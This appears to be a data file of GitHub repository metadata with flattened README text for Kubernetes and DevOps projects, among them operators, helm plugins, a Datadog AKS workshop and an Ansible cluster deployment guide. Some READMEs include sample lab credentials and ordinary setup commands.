ChoGathK,blogs,devops#docker#golang#javascript#k8s#nodejs#typescript,Chogath s Blogs Node js devops Links Chogath s Blogs https chogathk gitee io blogs Chogath s Blogs https chogathk github io blogs,2020-09-24T02:44:56Z,2020-12-29T10:47:16Z,Shell,User,1,6,0,102,master,ChoGathK,1,0,0,0,0,0,1
praveensripati,learn-aws,aws#big-data#k8s,Rant about AWS AWS is like a big ocean with 200 services like EC2 S3 RDS etc each of them with a tons of features AWS does spend a lot of effort and money around innovation AWS has really fascinated me It s tough to keep up with AWS This is an attempt to consolidate my learnings and findings around AWS This is also to make sure one is motivated and also learn more about AWS I would be adding more and more to this repository so keep looking around Especially for the different projects and applications around AWS here ApplicationsAndProjects README md Also I have written a good number of blogs articles on Big Data AWS and Kubernetes on my blog https www thecloudavenue com https www thecloudavenue com Feel free to submit any issues or pull requests for any changes to the documentation and the code At the end of the README md files and others I have listed down the TODO tasks which I would be interested in getting some help around Good Luck,2020-10-18T14:44:28Z,2020-12-14T02:06:58Z,Java,User,4,5,6,49,main,praveensripati,1,0,0,0,0,0,1
AbsaOSS,samlet,,samlet Samlet is a Kubernetes operator based on saml2aws https github com Versent saml2aws Why Samlet provides Kubernetes applications tied to organization IdP with seamless access to AWS resources via SAML 2 0 identity federation https docs aws amazon com IAM latest UserGuide idrolesproviderssaml html It stores generated AWS session credentials as k8s Secrets so that they can be consumed by application container as mounted AWS credentials file https docs aws amazon com credref latest refdocs creds config files html or wired as AWS SDK environment variables https docs aws amazon com credref latest refdocs environment variables html Secrets are automatically rotated 10 minutes before expiration period Reloading credentials and watching expiration time logic is left to a consumer Example Environment variables Following Saml2Aws Custom Resource once created in k8s cluster will case Samlet operator to request AWS credentials valid for 2 hours using example login credential keys are username and password credentials and create new target secret with AWS SDK environment variables These environment variables can be then wired from the secret to an application pod using envFrom option in Pod manifest yaml apiVersion samlet absa oss v1 kind Saml2Aws metadata name saml2aws sample spec Secret contains username password to authenticate against IDP type ADFS secretName examlpe login Secret to be created by controller containing issued AWS credentials targetSecretName target secret Format for generated secret env file or ini secretFormat envVariables Sepcify validitity time sessionDuration 2h The ARN of the role to assume roleARN arn aws iam 888888888888 role adfs saml2aws sample role resulting envVariables type secret could be consumed in Pod like yaml envFrom secretRef name target secret Credentials file Credentials file type formats target secret content in a way so it can be mounted into a Pod as a volume Once mounted it can be used as standard aws credentials ini file,2020-11-12T10:54:20Z,2020-12-28T07:07:21Z,Go,Organization,8,5,0,44,main,k0da#somaritane,2,0,6,0,0,0,11
bakito,kubexporter,kubectl-plugin#kubectl-plugins#oc-plugin,Go https github com bakito kubexporter workflows Go badge svg https github com bakito kubexporter actions query workflow 3AGo Docker Repository on Quay https quay io repository bakito kubexporter status Docker Repository on Quay https quay io repository bakito kubexporter Go Report Card https goreportcard com badge github com bakito kubexporter https goreportcard com report github com bakito kubexporter GitHub Release https img shields io github release bakito kubexporter svg style flat https github com bakito kubexporter releases KubExporter KubExporter allows you to export resources from kubernetes as yaml json files The configuration allows customization on which resources and which fields to exclude Install Downlad the latest binary from https github com bakito kubexporter releases Use as kubectl plugin Rename the binary to kubectl exporter bash kubectl exporter Usage bash Usage kubexporter flags Flags as string Username to impersonate for the operation as group stringArray Group to impersonate for the operation this flag can be repeated to specify multiple groups cache dir string Default cache directory default HOME kube cache certificate authority string Path to a cert file for the certificate authority c clear target If enabled the target dir is deleted before running the new export client certificate string Path to a client certificate file for TLS client key string Path to a client key file for TLS cluster string The name of the kubeconfig cluster to use config string config file context string The name of the kubeconfig context to use e exclude kinds strings Do not export excluded kinds h help help for kubexporter i include kinds strings Export only included kinds if included kinds are defined excluded will be ignored insecure skip tls verify If true the server s certificate will not be checked for validity This will make your HTTPS connections insecure kubeconfig string Path to the kubeconfig file to use for CLI requests l lists If enabled all resources are exported as lists instead of individual files n namespace string If present the namespace scope for this CLI request o output string Output format One of json yaml default yaml p progress If enabled the progress bar is shown default true q quiet If enabled output is prevented request timeout string The length of time to wait before giving up on a single server request Non zero values should contain a corresponding time unit e g 1s 2m 3h A value of zero means don t timeout requests default 0 s server string The address and port of the Kubernetes API server summary If enabled a summary is printed t target string Set the target directory default exports tls server name string Server name to use for server certificate validation If it is not provided the hostname used to contact the server is used token string Bearer token for authentication to the API server user string The name of the kubeconfig user to use v verbose If enabled errors during export are listed in summary version version for kubexporter w worker int The number of worker to use for the export default 1 kubexporter doc kubexporter gif Config KubExporter exports by default all resources and allows to exclude unwanted resources The benefit is that new custom resource definitions are automatically considered in the export Example configuration yaml summary true print a summary progress true print progress archive true create an archive namespace define a single namespace default all worker 1 define the number of parallel worker asLists false export as lists clearTarget true clear the target directory before exporting excluded kinds list all kinds to be excluded Binding ComponentStatus Endpoints Event LimitRange LocalSubjectAccessReview PersistentVolume Pod ReplicationController ReplicationControllerDummy RoleBindingRestriction Secret apps ReplicaSet batch Job events k8s io Event extensions ReplicaSet fields list fields that should be removed for all resources before exported slices are also traversed status metadata uid metadata selfLink metadata resourceVersion metadata creationTimestamp metadata generation metadata annotations kubectl kubernetes io last applied configuration kindFields kind specific excluded fields Service spec clusterIP,2020-12-03T13:13:18Z,2020-12-21T08:35:48Z,Go,User,1,5,0,43,main,bakito#dependabot[bot],2,9,9,0,8,0,22
zacheryph,k8s-gitops,,Homelab K8s Gitops GitOps state for my cluster using flux v2 Discord https img shields io badge discord chat 7289DA svg maxAge 60 style flat square https discord gg DNCynrJ k3s https img shields io badge k3s v1 19 2 orange style flat square https k3s io GitHub issues https img shields io github issues zacheryph k8s gitops style flat square https github com zacheryph k8s gitops issues GitHub last commit https img shields io github last commit zacheryph k8s gitops color purple style flat square https github com zacheryph k8s gitops commits master Overview Secret Management Secrets are managed by bin secrets sh Below is a short description of the commands and the two types of files that are automatically generated All secrets are able to use environment variables from secrets env which is secured by git crypt Refreshing of secrets have the caveat of only knowing if the source file is newer than the sealed secret This does not account for changed to secrets env that affect the secret If changes are made to existing values you will need to touch the secret s affected or remove their sealed secret counterparts Secrets are generated into cluster secrets and the kustomization yaml automatically generated containing them all Each secret exists in their respective namespace which is extracted from the kustomization yaml within the same directory the secret exists in As an added bonus there is a pre commit hook to ensure all sealed secrets exist and are up to date so that you do not forget to generate any new ones Secret Commands bin secrets sh check ensures all SealedSecret resources exist bin secrets sh refresh create update any secrets necessary bin secrets sh write recreate all secrets bin secrets sh wipe destroy all SealedSecret resources Secret Types secret name crypt env env format file that creates a secret with a key for each environment variable The secret name is the name of the file less the crypt env suffix secret name values yaml this is for HelmRelease style values They will generate a secret with a values yaml key containing the contents of this file The secret generated will be names secret name values Hardware Cluster is 3 built 1u servers with the following hardware Inwin 1W RF100S Chassis ASRock Rack E3C246D2I Intel Core i3 9100 16GB Memory 128GB M 2 2242 SSD OS 2x 6TB HGST Ultrastar longhorn Services Flux System The flux v2 manifests helm repositories HelmRepository resources System ingress ingress nginx cert manager kubedb kubedb operator longhorn persistent storage metallb metallb running in bgp mode prometheus prometheus grafana loki sealed secrets committable secrets Network blocky blocky dns server minio minio instances for public and internal use Services dashboard heimdall dashboard home assistant hass mosquitto mqtt openzwave wiki wiki js instance Devops drone ci server drone build namespace for done builds drone secrets houses secrets for drone pipelines gitea git management server registry harbor docker registry sonarqube source code scanner,2020-11-13T04:21:55Z,2020-12-29T01:31:00Z,Shell,User,1,5,1,401,main,zacheryph#renovate-bot,2,0,0,3,1,4,107
eshepelyuk,cmak-operator,cmak#helm#k8s#kafka#kafka-manager#kubernetes#kubernetes-operator#operator#ui,CMAK operator CMAK operator is a set of tools packaged as Helm chart that allows to install and configure CMAK https github com yahoo CMAK previously Kafka Manager into Kubernetes cluster CMAK https github com yahoo CMAK previously Kafka Manager is well known and mature tool for monitoring and managing Apache Kafka https kafka apache org clusters For detailled instructions about installation and configuration check CMAK operator homepage https github com eshepelyuk cmak operator,2020-08-28T16:16:51Z,2020-12-25T09:33:30Z,Python,User,1,5,6,48,master,eshepelyuk#eshepelyuknewagesol,2,11,11,0,2,0,2
ryanmaclean,k8s-dd-cnhh,aks#datadog#k8s,Monitoring Kubernetes with Datadog Intro to Datadog for CNHH Some useful commands as we run through the hands on portion Azure Integration Steps Note that these won t be required if using the new sign up in the future but for today s session we ll go through the old process Further the Subscription you deploy the read only Service Principal to should also be the one that contains your AKS cluster as we ll be using that data later on Get Tenant ID This command will help you get your tenant ID though the creation step should as well bash az account show output json jq r tenantId Set Up Service Principal In order to set up a service principal as per the Datadog docs for the Azure integration https docs datadoghq com integrations azure tab azurecliv20 integrating through the azure cli you ll first need to select the subscription you want bash az account list output table This outputs your subscriptions as a table so that you can copy the subscription ID that you need for the next step Again make sure this is the subscription your AKS cluster lives in Note If you ve only got one subscription and tenant or if the defaults for both are ok there s a full example at the end Then add a read only service principal to that subscription making sure to note the credentials for use with Datadog bash SUBSCRIPTIONID az account show output json jq r id echo SUBSCRIPTIONID az ad sp create for rbac role Monitoring Reader scopes subscriptions SUBSCRIPTIONID Full Example Use this only if you ve got one tenant one subscription or if the defaults are OK bash az ad sp create for rbac role Monitoring Reader scopes subscriptions az account list output json jq r 0 id This outputs your AppID Client ID password Client Secret and tenant you ll need all three over in Datadog so put them somewhere temporarily in case the Azure Shell session expires Add Service Principal to Datadog In Datadog navigate to the Azure Integration page https app datadoghq com account settings integrations azure and click the configuration tab as shown in the following image Datadog Azure Integration azuredatadog png Enter the Tenant AppID Client ID and Password Client Secret you got as output from the previous steps in Azure Cloud Shell Once entered click Install Integration You ve now set up Datadog to get Azure data flowing into Datadog for that subscription If you have more than one feel free to do this for the rest but for the purpose of our session we ll be using the one that contains the AKS cluster that already exists For Azure Cloud Shell Helm Helm chart link dtdg co ddhelm http dtdg co ddhelm Clone this repository then cd to that folder bash git clone https github com ryanmaclean k8s dd cnhh git cd k8s dd cnhh Add the helm repository bash helm repo add datadog https helm datadoghq com helm repo add stable https kubernetes charts storage googleapis com helm repo update Get Datadog API and APP Keys 1 Export the API key Get the API from https app datadoghq com account settings api and paste it after the sign in the following example bash export DDAPIKEY KEYFROMDATADOG 2 Export the APP key Get the API from https app datadoghq com account settings api scroll to the section after API for the APP keys Enter cnhh in the New application key field and click Create Application Key Hover over the new key and paste it after the sign in the following example bash export DDAPPKEY KEYFROMDATADOG 3 Install the Agent Now that we have both exported in our shell we can proceded to the agent install bash helm install datadogagent set datadog apiKey DDAPIKEY set datadog appKey DDAPPKEY f k8s yaml files values yaml datadog datadog Things should now be appearing in Datadog but we ll also want to ensure that we get the kubernetes metrics as well To do so open the values yaml file we used previously and around line 276 remove the after the env line and add the following the following text yaml env name DDKUBELETTLSVERIFY value false Then we ll re apply our helm chart in order to update it bash helm upgrade datadogagent set datadog apiKey DDAPIKEY set datadog appKey DDAPPKEY f k8s yaml files values yaml datadog datadog We should now see the some of the infrastructure start to come online in Datadog Note that it may take a couple of minutes but will eventually look like the following Datadog Event Stream aksineventstream png Let s Break Some Things Edit the values yaml k8s yaml files values yaml file once again in your editor At lines 796 800 we ll set the CPU to 20 millicores and RAM to 32 mibibytes much lower than they should be but will help us see what happeneds when resources are low The resulting section should look like this yaml resources requests cpu 20m memory 32Mi limits cpu 20m memory 32Mi Run helm again to upgrade bash helm upgrade datadogagent set datadog apiKey DDAPIKEY set datadog appKey DDAPPKEY f k8s yaml files values yaml datadog datadog Open the event stream to confirm the problems we d expect https app datadoghq com event stream Reverting our Changes Normally we d take care of this in the lab by re provisioning but for those running their own clusters feel free to simply re download the YAML and upgrade via helm once more bash wget https raw githubusercontent com helm charts master stable datadog values yaml mv values yaml k8s yaml files helm upgrade datadogagent set datadog apiKey DDAPIKEY set datadog appKey DDAPPKEY f k8s yaml files values yaml datadog datadog Cluster Agent We ll now deploy the cluster agent in the values yaml file the block around line 390 contains the cluster agent config Change the false on line 397 to true then save and upgrade the cluster once more Last time I promise Hint you can use code k8s yaml files values yaml to open it in the embedded VS Code editor just remember to hit cmd s on macOS or ctrl s Linux Windows to save the file before continuing It should look like this when you re done yaml clusterAgent param enabled boolean required Set this to true to enable Datadog Cluster Agent enabled true Once it s saved we ll run the familiar upgrade command via helm though note we ll replace this with the valuesfull yaml version which enables a few more parameters bash helm upgrade datadogagent set datadog apiKey DDAPIKEY set datadog appKey DDAPPKEY f k8s yaml files values yaml datadog datadog Exploring Kubernetes in Datadog Note that though we now have data in Datadog we also need to configure the integration This can be done via the integrations page specifically in the Kubernetes integration tab https app datadoghq com account settings integrations kubernetes In the configuration tab click Install Integration as pictured below we ve done the heavy lifting already Datadog Kubernetes Integration installk8sintegration png Once we have the Kubernetes Integration installed we can then explore the Kubernetes default dashboards https app datadoghq com screen integration 86 kubernetes overview in Datadog AKS in Datadog aksdatadog png Deploy Storedog We ve created a sample app to allow us to look at other Datadog services The manifests for this application can be found in the storedog storedog subfolder In order to launch all of the microservices at once the following command will apply all of the yaml files in that folder bash kubectl apply f storedog Check Containers in Datadog The containers we ve just launched should now also be viewable in Datadog s container view https app datadoghq com containers Grab the URL for Storedog Back in the Azure portal you can now get the IP address for our storedog frontend Note that it s just an IP for now as we re testing but we can add a DNS record for these when required storedog IP in Azure Portal storedogip png Check out Storedog Storedog our microservices app launched in AKS is now reachable via the IP we grabbed above We ll check it out for now but we ll use this in our next section within Datadog storedogscreenshot storedog png END HERE CONTINUE WITH DEMO IN DATADOG,2020-09-28T16:47:19Z,2020-10-28T12:55:29Z,n/a,User,2,5,1,43,main,ryanmaclean#lastcoolnameleft,2,0,0,0,0,0,3
sambvfx,beam-flink-k8s,,Beam Flink Kubernetes This repo is a bare minimum sample of running a python beam pipeline on flink deployed in a kubernetes cluster Setup via minikube This assumes you re starting in an environment with python a recent version of beam installed and minikube https kubernetes io docs tasks tools install minikube Start up a simple minikube k8s cluster shell script minikube start cpus 4 memory 6144 disk size 20gb Build a slightly modified flink image that has docker installed Building this directly in the minikube registry simplifies things shell script eval minikube docker env docker build flink t docker flink 1 10 Deployment You can deploy flink with or without a job server If you deploy without you must run your pipeline using the FlinkRunner along with the option flinksubmituberjar The FlinkRunner will start a local job service via java and expects the client to have java install Using flinksubmituberjar will pack all artifacts into the jar file it uploads to flink This is required due to the local job server and the flink taskmanager not sharing the staging volume Alternatively you can deploy a job service into the k8s cluster and run your pipeline using the PortableRunner This requires a more complicated k8s deployment because we must share volume between the job service and the flink taskmanager Flink With No Job Server Deploy the flink components to kubernetes shell script kubectl apply f k8s withoutjobserver flink yaml Wait a minute for the pods to spin up shell script kubectl get pods Submit a beam pipeline shell script FLINKMASTERURL minikube service flink jobmanager rest url python m pipeline runner FlinkRunner flinkversion 1 10 flinkmaster FLINKMASTERURL environmenttype DOCKER savemainsession flinksubmituberjar Flink With Job Server It s also possible to use the PortableRunner by submitting the pipeline to a job server running in k8s The job server and the flink taskmanagers need to share the same artifact staging volume This is necessary so the sdk harness can find the artifacts First deploy the persistent volumes and claims shell script kubectl apply f k8s withjobserver shared yaml Then deploy flink shell script kubectl apply f k8s withjobserver flink yaml Last deploy the job server shell script kubectl apply f k8s withjobserver beamflinkjobserver yaml Submit a beam pipeline shell script JOBENDPOINT minikube service flink beam jobserver url sed 1qd ARTIFACTENDPOINT minikube service flink beam jobserver url sed 2qd PYTHONVERSION python version cut d f2 cut d f1 2 BEAMVERSION python c import apachebeamprint apachebeam version python m pipeline runner PortableRunner jobendpoint JOBENDPOINT artifactendpoint ARTIFACTENDPOINT savemainsession environmenttype DOCKER environmentconfig apache beampython PYTHONVERSIONsdk BEAMVERSION Tips Monitoring Debugging TIP Pre download the sdk container in the docker in docker service on the taskworker If you don t do this then the taskworker may timeout waiting for the sdk container to spin up shell script PYTHONVERSION python version cut d f2 cut d f1 2 BEAMVERSION python c import apachebeamprint apachebeam version TASKMANAGERPOD kubectl get pods selector component taskmanager no headers o name kubectl exec TASKMANAGERPOD c taskmanager docker pull apache beampython PYTHONVERSIONsdk BEAMVERSION Open the flink web UI this should open a tab in your browser shell script minikube service flink jobmanager rest Tail the taskmanager logs shell script TASKMANAGERPOD kubectl get pods selector component taskmanager no headers o name kubectl logs f TASKMANAGERPOD c taskmanager Tail SDK Harness logs shell script TASKMANAGERPOD kubectl get pods selector component taskmanager no headers o name kubectl exec it TASKMANAGERPOD c taskmanager bash docker logs f docker ps lq,2020-08-28T04:17:40Z,2020-11-05T21:25:04Z,Python,User,1,5,1,7,master,sambvfx#jkff,2,0,0,0,0,0,1
bbachi,k8s-sidecar-container-pattern,,k8s sidecar container pattern Example project for How to implement sidecar pattern,2020-09-05T17:39:35Z,2020-12-25T14:24:34Z,n/a,User,2,5,0,3,master,bbachi,1,0,0,0,0,0,0
didil,k8s-hello-mutating-webhook,golang#k8s#kubernetes#kubernetes-webhook,K8s Hello Mutating Webhook A Kubernetes Mutating Admission Webhook example using Go This is a companion repository for the Article Building a Kubernetes Mutating Admission Webhook A magic way to inject a file into Pod Containers https medium com didil building a kubernetes mutating admission webhook 7e48729523ed This is proof of concept code make sure to review carefully before using in a production system Run tests make test Deploy Define shell env define env vars export CONTAINERREPO quay io my user my repo export CONTAINERVERSION x y z Build Push Webhook make docker build make docker push for this example you ll need to make the container repository public unless you ll be specifying ImagePullSecrets on the Pod Deploy to K8s cluster make k8s deploy Mutated pod example k run busybox 1 image busybox restart Never l hello true sleep 3600 k exec busybox 1 it ls etc config hello txt The output should be etc config hello txt k exec busybox 1 it sh c cat etc config hello txt The output should be Hello from the admission controller We successfully mutated our pod spec and added an arbitary volume file in there yay Cleanup Delete all k8s resources make k8s delete all,2020-10-02T19:16:36Z,2020-12-10T02:52:24Z,Go,User,3,5,1,8,main,didil,1,0,0,1,0,0,0
GeeksCAT,from-zero-to-k8s,hacktoberfest#howto#k3s#k3s-cluster#k8s#tutorial,From zero to Kubernetes This is just a simple howto devised to guide you to deploy a Kubernetes cluster We ll use k3s to provide a simple cluster there are two options manual mode manualmode md automated mode automatedmode md For doubts or problemes don t doubt to raise an issue https github com GeeksCAT from zero to k8s issues new,2020-10-16T15:29:19Z,2020-11-30T11:20:41Z,n/a,Organization,5,5,0,3,main,XaviTorello#jbagot,2,0,0,0,0,0,2
thynquest,helm-pack,helm#helm-plugin#k8s#kubernetes#pipeline,helm pack Build Status https travis ci org thynquest helm pack svg branch master https travis ci org thynquest helm pack This is a helm plugin designed to be able to set properties before packaging it has the same flags as the helm package command except that you can define properties when packaging helm pack myfolder set myprop myval Description The goal of this helm plugin is to be able to set properties before packaging Suppose that you have the following pipeline write code for you app push your code to your repo which will build a docker image automatically tagged suppose the tag is mytag1234 after building your image you automatically trigger another pipeline associated to the helm chart repo which contains a values yaml with some unset value yaml deployment name deploymentname replicas 1 version imageversion UNSET VALUE container image my repo url path image configMapRef name deployment config limits memory 1Gi cpu 1000m request memory 500Mi cpu 500m imagePullPolicy Always then in order to create our helm package according to the docker image previously built we need to inject the version value mytag1234 during the packaging process so we won t have to make helm install mypackage set deployment version mytag1234 during the installation but instead helm package set deployment version mytag1234 so that way we during the installation we just have to execute helm install mypackage knowing that the version dependency has been resolved earlier during the packaging process IMPORTANT NOTE this is still a work in progress but if you have any issues remarks let me know Install The plugin will be downloaded from github sh helm plugin install https github com thynquest helm pack git Usage the same options of the package command apply here with the possibilty to set property helm pack myfolder set myproperty myvalue,2020-09-05T13:25:32Z,2020-12-07T08:02:14Z,Go,User,2,5,0,20,master,thynquest,1,7,7,0,0,0,0
zze326,ansible-deploy-kubernetes,amd64#ansible#binary#ha#k8s#kubernetes#multiple-master,Ansible Kubernetes x CNI x Dashboard UI x core DNS x Node x Ingress Controller x Master Keepalived Nginx x CentOS 7 Ubuntu 16 18 x v1 17 x v1 18 x v1 19 x ISSUE https www zze xyz archives kubernetes deploy binary mutil master html CentOS 7 8 Ubuntu 16 04 Ubuntu python Ansible python Ubuntu CentOS sudo apt install python minimal https pan baidu com s 1uJwhrINaO SlTYSjeVOktw q3n1 bash kubernetes server linux amd64 v1 17 13 tar gz kubernetes server linux amd64 v1 18 10 tar gz kubernetes server linux amd64 v1 19 3 tar gz packages cfssl cfssl certinfolinux amd64 cfssljsonlinux amd64 cfssllinux amd64 cni plugins linux amd64 v0 8 7 tgz docker 19 03 9 tgz etcd v3 4 13 linux amd64 tar gz packages Kubernetes kubernetes server linux amd64 v tar gz Kubernetes https github com kubernetes kubernetes tree master CHANGELOG Kubernetes packages v1 19 3 packages bash tree packages packages cfssl cfssl certinfolinux amd64 cfssljsonlinux amd64 cfssllinux amd64 cni plugins linux amd64 v0 8 7 tgz docker 19 03 9 tgz etcd v3 4 13 linux amd64 tar gz kubernetes server linux amd64 v1 19 3 tar gz 1 directory 7 files packages opt packages opt packages hosts yml packagedir Ansible Git Ansible Git CentOS 7 8 YUM bash yum install ansible git y Ubuntu apt Ansible Ansible sudo apt update sudo apt get install software properties common sudo apt add repository yes ppa ansible ansible 2 7 6 sudo apt update sudo apt get install ansible Ansible Key Google bash vim etc ansible ansible cfg hostkeychecking False clone Project bash git clone https github com zze326 kubernetes deploy ansible git bash ls kubernetes deploy ansible hosts yml manifests README md roles run yml hosts yml manifests Kubernetes manifests CoreDNSFlannelDashboard manifests roles Ansible run yml Ansible Playbook hosts yml hosts yml yaml all vars SSH ansibleuser root SSH ansiblesshpass root1234 sudo ansiblesudopass root1234 Master ismutilmaster yes Master Nginx Master APIServerNginx Keepalived VIP VIP virtualip 10 0 1 200 Keepalived VIP virtualipdevice eth0 Nginx APIServer APIServer 6443 APIServer 6443 proxymasterport 7443 kube apiserverkube controller managerkube schedulerkubeletkube proxynginxcnidockerkeepalived installdir opt apps kubernetes 1 19 0 zze ansible bin tar gz packagedir opt packages kubernetes ETCD Ansible sudo ansible playbook tlsdir opt k8stls NTP ntphost ntp1 aliyun com internet ntpdate havenetwork yes yum apt CentOS 7Ubuntu 16Ubuntu 18 replacerepo yes API Server IP master master IP master master IP haproxy IP Master IP apiserverextiplist 10 0 1 210 10 0 1 211 10 0 1 212 Docker HTTPS HTTP opt apps docker conf daemon json dockerinsecureregistries 10 0 1 122 10 0 1 123 Docker dockerregistrymirrors https 7hsct51i mirror aliyuncs com kubelet Token head c 16 dev urandom od An t x tr d kubeletbootstraptoken 8fba966b6e3b5d182960a30f6cb94428 Kubernetes pause pauseimage registry cn shenzhen aliyuncs com zze pause 3 2 Dashboard Web UI 30000 32767 dashboardport 30001 Dashboard Token hosts yml dashboardtokenfile dashboardtoken txt Ingress hosts ingress yes Ingress Controller Node enableingress yes YAML IP hosts 10 0 1 201 Kubernetes hostname k8s master1 Master master yes Node node yes ETCD etcd yes API Server Nginx Keepalived Master proxymaster yes Keepalived Keepalived VIP proxypriority 110 10 0 1 202 hostname k8s master2 node yes master yes etcd yes proxymaster yes proxypriority 100 10 0 1 203 hostname k8s node1 etcd yes node yes ingress yes Master Node Kubernete ETCD 10 0 1 201 10 0 1 202 Master API Server 10 0 1 201 proxypriority 10 0 1 202 Keepalived VIP 10 0 1 201 hosts yml IP hosts yml yaml all vars ansibleuser root ansiblesshpass root1234 ansiblesudopass root1234 ismutilmaster yes virtualip 10 0 1 200 virtualipdevice eth0 proxymasterport 7443 installdir opt apps packagedir opt packages tlsdir opt k8stls ntphost ntp1 aliyun com havenetwork yes replacerepo yes dockerregistrymirrors https 7hsct51i mirror aliyuncs com kubeletbootstraptoken 8fba966b6e3b5d182960a30f6cb94428 pauseimage registry cn shenzhen aliyuncs com zze pause 3 2 dashboardport 30001 dashboardtokenfile dashboardtoken txt hosts 10 0 1 201 hostname k8s master1 master yes node yes etcd yes proxymaster yes proxypriority 110 10 0 1 202 hostname k8s master2 master yes node yes etcd yes proxymaster yes proxypriority 100 10 0 1 203 hostname k8s node1 etcd yes node yes ingress yes bash sudo ansible playbook i hosts yml run yml TASK deploymanifests token ok 10 0 1 201 msg token eyJhbGciOiJSUzI1NiIsImtpZCI6IlVnU2Z6aTM1a0I1S3J5T04yVmMwQTNoWC0xZnF2RThybXBzQU9pcWhUYnMifQ eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4tamdzZHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMWI3YzcxMWYtMGQwYi00MTJjLTkwMGEtMzY5ZmVmZGZiMzZjIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhc2hib2FyZC1hZG1pbiJ9 oxjPtZhyOylFO8mvWBJ6E8UD42161 jxLMXYeJuQSPKswioUqR2Fkx3p7DeYb3b0A4I4cT0APC1nM1tQnuah9UH9wb6hryzdoiH8WVfNZjjGJcPCC59hMOLFfBswQOo5f9zIbZnMdDjo9NXo96RQrxluJxQMl3UYpr2Gn5CRwZrMVQBRQ5mhDd2yTK wF I0rcwoIDAUGt ajFRZ7J9V4AHxXjHDfA0XqVCay25ZKiJ50UkkGV0PCwU7VwZzdNqF nOxRkhDnX7w13LVxlwaWvpBMcHimX2HU0P6orufslKlVrQAdj3nenZ4dKPW0Ss1ndK0nRUpOuOgd4hi7g skipping 10 0 1 202 skipping 10 0 1 203 TASK deploymanifests token ansible skipping 10 0 1 202 skipping 10 0 1 203 changed 10 0 1 201 PLAY RECAP 10 0 1 201 ok 117 changed 82 unreachable 0 failed 0 skipped 19 rescued 0 ignored 0 10 0 1 202 ok 69 changed 53 unreachable 0 failed 0 skipped 33 rescued 0 ignored 0 10 0 1 203 ok 49 changed 39 unreachable 0 failed 0 skipped 53 rescued 0 ignored 0 Node Node hosts yml node yes Node 10 0 1 204 Node hosts yml yml all vars ansibleuser root ansiblesshpass root1234 ansiblesudopass root1234 hosts 10 0 1 203 hostname k8s node1 etcd yes node yes 10 0 1 204 hostname k8s node2 node yes Playbook Node Task bash sudo ansible playbook i hosts yml run yml limit 10 0 1 204 Node 1 limit Node IP 2 Node IP IP ansible playbook limit Master Node Kubulet bash kubectl get csr grep Pending node csr jHEi1yP3TNX80M84KPRxIziC7E bkf07rJpal4Vw 2m16s kubernetes io kube apiserver client kubelet kubelet bootstrap Pending Master bash kubectl get csr awk NF Pending print 1 xargs i kubectl certificate approve certificatesigningrequest certificates k8s io node csr jHEi1yP3TNX80M84KPRxIziC7E bkf07rJpal4Vw approved bash kubectl get node NAME STATUS ROLES AGE VERSION k8s master1 Ready 26m v1 19 3 k8s master2 Ready 21m v1 19 3 k8s node1 Ready 26m v1 19 3 k8s node2 NotReady 22s v1 19 3 Node Master 10 0 1 201 10 0 1 202 Node bash kubectl get node NAME STATUS ROLES AGE VERSION k8s master1 Ready 113s v1 19 0 k8s master2 Ready 113s v1 19 0 k8s node1 Ready 113s v1 19 0 CNI Pod Deployment bash cat testdeploy yml apiVersion apps v1 kind Deployment metadata labels app test name test spec replicas 3 selector matchLabels app test template metadata labels app test spec containers image busybox 1 28 4 name busybox command sleep 3600 kubectl apply f testdeploy yml deployment apps test created Pod ping Pod bash kubectl get pod o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES test 54fdd84b68 j9zwq 1 1 Running 0 77s 10 244 0 2 k8s node1 test 54fdd84b68 w64jv 1 1 Running 0 77s 10 244 2 4 k8s master1 test 54fdd84b68 zptw8 1 1 Running 0 77s 10 244 1 3 k8s master2 kubectl exec it test 54fdd84b68 j9zwq sh ping 10 244 2 4 PING 10 244 2 4 10 244 2 4 56 data bytes 64 bytes from 10 244 2 4 seq 0 ttl 62 time 1 334 ms C 10 244 2 4 ping statistics 1 packets transmitted 1 packets received 0 packet loss round trip min avg max 1 334 1 334 1 334 ms ping 10 244 1 3 PING 10 244 1 3 10 244 1 3 56 data bytes 64 bytes from 10 244 1 3 seq 0 ttl 62 time 0 761 ms 64 bytes from 10 244 1 3 seq 1 ttl 62 time 0 467 ms C 10 244 1 3 ping statistics 2 packets transmitted 2 packets received 0 packet loss round trip min avg max 0 467 0 614 0 761 ms Core DNS Pod kubernetes IP bash kubectl exec it test 54fdd84b68 j9zwq sh nslookup kubernetes Server 10 0 0 2 Address 1 10 0 0 2 kube dns kube system svc cluster local Name kubernetes Address 1 10 0 0 1 kubernetes default svc cluster local Core DNS Dashboard UI Dashboard NodePort Service hosts yml dashboardport 30001 Dashboard UI https NodeIP 30001 https 10 0 1 203 30001 Ansible Role hosts yml dashboardtoken txt hosts yml dashboardtokenfile Dashboard UI Token bash ls dashboardtoken txt hosts yml manifests README md roles run yml cat dashboardtoken txt eyJhbGciOiJSUzI1NiIsImtpZCI6IlhjQU9EckdpRHpSNTZTQXoyMjJHa3lRWVd4UGw2ZGhhNjk0RkhUZlBKWkUifQ 